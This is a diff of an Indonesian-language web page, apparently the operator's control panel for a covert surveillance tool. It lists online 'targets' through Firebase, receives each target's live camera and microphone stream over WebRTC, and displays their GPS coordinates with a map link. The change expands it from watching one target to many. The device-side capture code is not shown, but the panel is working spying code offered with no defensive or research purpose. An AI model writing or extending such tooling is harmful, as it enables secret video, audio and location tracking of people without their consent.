@@ -2,37 +2,38 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Admin Real-Time Monitoring</title>
+    <title>Master Panel Monitoring</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
-        .dashboard { display: grid; grid-template-columns: 1fr 350px; gap: 20px; max-width: 1200px; margin: 0 auto; }
-        .video-wrapper { background: #111; border: 2px solid #00ff00; position: relative; border-radius: 10px; overflow: hidden; }
-        video { width: 100%; display: block; }
-        .panel { background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
-        .btn-audio { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; margin-bottom: 15px; }
-        .status-on { color: #00ff00; }
-        .status-off { color: #ff0000; }
-        .log-box { font-size: 12px; color: #888; margin-top: 15px; height: 100px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; }
+        body { background: #0f172a; color: #f8fafc; font-family: 'Inter', sans-serif; display: flex; height: 100vh; margin: 0; }
+        #sidebar { width: 300px; background: #1e293b; border-right: 1px solid #334155; padding: 20px; overflow-y: auto; }
+        #main-view { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .target-card { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 10px; cursor: pointer; border: 1px solid transparent; }
+        .target-card:hover { border-color: #38bdf8; }
+        .target-card.active { background: #075985; border-color: #38bdf8; }
+        #video-container { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 12px; overflow: hidden; border: 2px solid #38bdf8; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .controls { margin-top: 20px; background: #1e293b; padding: 20px; border-radius: 12px; width: 100%; max-width: 800px; }
+        .btn { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        .status-badge { font-size: 12px; padding: 2px 8px; border-radius: 99px; background: #22c55e; color: white; }
     </style>
 </head>
 <body>
-    <div class="dashboard">
-        <div class="video-wrapper">
-            <video id="rv" autoplay playsinline></video>
-            <div style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:5px;">LIVE FEED</div>
-        </div>
+    <div id="sidebar">
+        <h2 style="margin-top:0">Target Aktif</h2>
+        <div id="target-list">Menunggu target...</div>
+    </div>
 
-        <div class="panel">
-            <button id="audioBtn" class="btn-audio">KLIK UNTUK SUARA (Wajib)</button>
-            
-            <h3>STATUS TARGET</h3>
-            <p>Koneksi: <span id="conn-stat" class="status-off">OFFLINE</span></p>
-            <p>Lokasi: <span id="loc-data" style="color:white">-</span></p>
-            <button onclick="window.open(mapUrl, '_blank')" id="mapBtn" style="width:100%; padding:8px;" disabled>BUKA MAPS</button>
-            
-            <div class="log-box" id="logs">Sistem dimulai...</div>
+    <div id="main-view">
+        <h2 id="active-title">Pilih Target di Samping</h2>
+        <div id="video-container">
+            <video id="rv" autoplay playsinline></video>
+        </div>
+        <div class="controls">
+            <button class="btn" onclick="activateAudio()">🔊 AKTIFKAN SUARA</button>
+            <p id="loc-info">Koordinat: -</p>
+            <button class="btn" style="background:#ef4444; color:white;" onclick="location.reload()">RELOAD PANEL</button>
         </div>
     </div>
 
@@ -43,86 +44,76 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database().ref('auto_p2p_v4');
+        const rootDb = firebase.database().ref('multi_monitor');
 
-        let pc;
-        let mapUrl = "";
+        let currentTargetId = null;
+        let pc = null;
 
-        function addLog(msg) {
-            const div = document.getElementById('logs');
-            div.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            div.scrollTop = div.scrollHeight;
-        }
+        // 1. Pantau Daftar Target
+        rootDb.on('value', snapshot => {
+            const listDiv = document.getElementById('target-list');
+            listDiv.innerHTML = "";
+            const data = snapshot.val();
+            
+            if(!data) { listDiv.innerHTML = "Tidak ada target aktif."; return; }
 
-        async function createAnswer() {
-            if (pc) pc.close();
-            pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            Object.keys(data).forEach(id => {
+                const target = data[id];
+                // Cek jika masih aktif (dalam 30 detik terakhir)
+                if (target.status && Date.now() - target.status.lastSeen < 30000) {
+                    const card = document.createElement('div');
+                    card.className = `target-card ${id === currentTargetId ? 'active' : ''}`;
+                    card.innerHTML = `<strong>${id}</strong> <span class="status-badge">ONLINE</span><br>
+                                     <small>Lat: ${target.status.lat.toFixed(4)}, Lng: ${target.status.lng.toFixed(4)}</small>`;
+                    card.onclick = () => selectTarget(id);
+                    listDiv.appendChild(card);
+                }
             });
+        });
 
-            pc.ontrack = e => {
-                document.getElementById('rv').srcObject = e.streams[0];
-                addLog("Stream diterima.");
-            };
+        // 2. Fungsi Memilih Target
+        async function selectTarget(id) {
+            if (currentTargetId === id) return;
+            if (pc) pc.close();
+            
+            currentTargetId = id;
+            document.getElementById('active-title').innerText = "Monitoring: " + id;
+            addLog(`Menyambungkan ke ${id}...`);
 
-            pc.onicecandidate = e => {
-                if (e.candidate) db.child('ice_monitor').push(e.candidate.toJSON());
-            };
+            const db = rootDb.child(id);
+            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
 
-            // Ambil Offer
+            pc.ontrack = e => { document.getElementById('rv').srcObject = e.streams[0]; };
+            pc.onicecandidate = e => { if(e.candidate) db.child('ice_m').push(e.candidate.toJSON()); };
+
+            // Ambil Offer dari Target tertentu
             db.child('sdp/offer').on('value', async s => {
                 const o = s.val();
-                if (o && pc && !pc.currentRemoteDescription) {
-                    addLog("Offer ditemukan, mengirim Answer...");
+                if (o && id === currentTargetId && !pc.currentRemoteDescription) {
                     await pc.setRemoteDescription(new RTCSessionDescription(o));
                     const a = await pc.createAnswer();
                     await pc.setLocalDescription(a);
-                    await db.child('sdp/answer').set({ type: a.type, sdp: a.sdp });
+                    db.child('sdp/answer').set({ type: a.type, sdp: a.sdp });
                 }
             });
 
-            // ICE Target
-            db.child('ice_target').on('child_added', s => {
-                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val()));
+            db.child('ice_t').on('child_added', s => {
+                if (id === currentTargetId) pc.addIceCandidate(new RTCIceCandidate(s.val()));
+            });
+
+            db.child('status').on('value', s => {
+                const d = s.val();
+                if(d) document.getElementById('loc-info').innerHTML = `Koordinat: ${d.lat}, ${d.lng} | <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#38bdf8">Buka Peta</a>`;
             });
         }
 
-        // Monitoring Heartbeat
-        db.child('status').on('value', s => {
-            const val = s.val();
-            const statText = document.getElementById('conn-stat');
-            if (val && (Date.now() - val.lastActive < 10000)) {
-                statText.innerText = "ONLINE";
-                statText.className = "status-on";
-                document.getElementById('loc-data').innerText = `${val.lat.toFixed(4)}, ${val.lng.toFixed(4)}`;
-                mapUrl = `https://www.google.com/maps?q=${val.lat},${val.lng}`;
-                document.getElementById('mapBtn').disabled = false;
-            } else {
-                statText.innerText = "OFFLINE";
-                statText.className = "status-off";
-            }
-        });
+        function activateAudio() {
+            const v = document.getElementById('rv');
+            v.muted = false;
+            v.play();
+        }
 
-        // Deteksi jika Target melakukan refresh (Offer hilang lalu muncul lagi)
-        db.child('sdp/offer').on('value', s => {
-            if (s.exists()) {
-                addLog("Target terdeteksi aktif, menyambungkan...");
-                createAnswer();
-            } else {
-                addLog("Menunggu target...");
-            }
-        });
-
-        document.getElementById('audioBtn').onclick = function() {
-            document.getElementById('rv').muted = false;
-            document.getElementById('rv').play();
-            this.innerText = "AUDIO AKTIF";
-            this.style.background = "#333";
-            this.style.color = "#00ff00";
-        };
-
-        // Bersihkan answer saat monitor refresh agar target tahu kita baru saja refresh
-        window.onbeforeunload = () => { db.child('sdp/answer').remove(); };
+        function addLog(m) { console.log(m); }
     </script>
 </body>
 </html>
